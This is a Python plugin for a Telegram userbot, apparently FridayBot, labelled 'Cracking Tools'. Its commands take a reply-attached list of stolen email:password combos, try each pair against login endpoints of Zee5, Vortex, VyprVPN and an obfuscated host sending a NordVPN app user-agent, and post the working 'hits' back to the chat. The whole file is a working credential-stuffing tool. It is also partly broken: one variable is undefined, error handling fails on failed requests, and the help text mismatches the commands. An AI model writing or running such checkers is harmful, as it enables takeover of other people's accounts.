import os

import requests

from fridaybot import CMD_HELP
from fridaybot.utils import friday_on_cmd

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}


@friday.on(friday_on_cmd(pattern="cz5$"))
async def zee5(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        try:
            meke = requests.get(
                f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
            ).json()
        except:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @FridayOT")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cnd$"))
async def vypr(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        sedlyf = {"username": email, "password": password}
        try:
            meke = requests.post(
                url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                headers=data,
                json=sedlyf,
            ).json()
        except Exception:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @FridayOT")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cvx$"))
async def vortex(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        sedlyf = {"email": email, "pass": password}
        try:
            meke = requests.post(
                url="https://vortex-api.gg/login", headers=data2, json=sedlyf
            ).json()
        except Exception:
            meke = None
        if meke.get("token"):
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @FridayOT")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


@friday.on(friday_on_cmd(pattern="cvr$"))
async def vortex(event):
    await event.edit(
        "`Checking Your Combos. This May Take Time Depending On No of Combos.`"
    )
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    os.remove(starky)
    if len(stark_dict) > 50:
        await event.edit("`Woah, Thats A Lot Of Combos. Keep 50 As Limit`")
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        data = {
            "username": email,
            "password": password,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X)",
            "Connection": "close",
            "locale": "en",
            "X-GF-PLATFORM": "android",
            "X-GF-PRODUCT": "vyprvpn",
            "X-GF-Agent": "VyprVPN Android v2.6.4.3156. (1b33ca24)",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            meke = requests.get(url=noob, headers=data).text
        except Exception:
            meke = None
        if "invalid username or password" in meke:
            bads += 1
        else:
            hits += 1
            plan = find_between(meke, 'account_level_display": "', '"')
            hits_dict.append(f"{email}:{password} | Plan = {plan}")
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + " | @FridayOT")
    await borg.send_file(
        event.chat_id,
        "hits.txt",
        caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
    )
    os.remove("hits.txt")


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


CMD_HELP.update(
    {
        "cracking_tools": "**Cracking Tools**\
\n\n**Syntax : **`.cz5 <reply to combo>`\
\n**Usage :** Checks for Zee5 accounts from combo.\
\n\n**Syntax : **`.cnd <reply to combo>`\
\n**Usage :** Checks for VYPR accounts from combo.\
\n\n**Syntax : **`.cvx <reply to combo>`\
\n**Usage :** Checks for Vortex accounts from combo.\
\n\n**Syntax : **`.cz5 <reply to combo>`\
\n**Usage :** Checks for Zee5 accounts from combo.\
\n\n**Syntax : **`.proxy <reply to proxies file>`\
\n**Usage :** Checks for alive proxies."
    }
)
